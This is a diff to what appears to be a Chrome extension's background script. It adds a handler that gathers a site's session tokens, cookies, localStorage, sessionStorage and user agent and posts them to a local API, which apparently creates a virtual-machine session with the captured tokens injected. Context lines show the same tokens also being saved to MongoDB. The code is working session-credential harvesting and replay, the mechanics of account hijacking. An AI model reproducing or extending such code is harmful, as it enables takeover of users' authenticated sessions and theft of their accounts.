@@ -81,7 +81,72 @@ chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
       });
     return true; // Keep message channel open for async response
   }
+  
+  if (request.action === 'createVMSession') {
+    console.log('🖥️ Received request to create VM session');
+    createVMSession(request.data)
+      .then((result) => {
+        console.log('✅ VM session created successfully:', result);
+        sendResponse({ success: true, result });
+      })
+      .catch((error) => {
+        console.error('❌ Error creating VM session:', error);
+        sendResponse({ success: false, error: error.message });
+      });
+    return true; // Keep message channel open for async response
+  }
 });
+
+// Function to create VM session with injected tokens
+async function createVMSession(tokenData) {
+  try {
+    console.log('🖥️ Creating VM session with token data:', {
+      domain: tokenData.domain,
+      url: tokenData.url,
+      tokenCount: Object.keys(tokenData.tokens || {}).length,
+      cookieCount: Object.keys(tokenData.cookies || {}).length
+    });
+    
+    // Call VM integration API
+    const response = await fetch('http://localhost:3003/api/create-vm-session', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify({
+        tokenId: `token_${tokenData.domain}_${Date.now()}`,
+        targetUrl: tokenData.url,
+        sessionData: {
+          domain: tokenData.domain,
+          url: tokenData.url,
+          tokens: tokenData.tokens || {},
+          cookies: tokenData.cookies || {},
+          localStorage: tokenData.localStorage || {},
+          sessionStorage: tokenData.sessionStorage || {},
+          timestamp: new Date().toISOString(),
+          userAgent: tokenData.userAgent
+        }
+      })
+    });
+    
+    if (!response.ok) {
+      const errorText = await response.text();
+      throw new Error(`VM API error: ${response.status} - ${errorText}`);
+    }
+    
+    const result = await response.json();
+    console.log('✅ VM session created:', result);
+    
+    // Update badge to show VM session created
+    updateBadge();
+    
+    return result;
+    
+  } catch (error) {
+    console.error('💥 Failed to create VM session:', error);
+    throw error;
+  }
+}
 
 // Function to save tokens to MongoDB
 async function saveTokensToMongoDB(tokenData) {
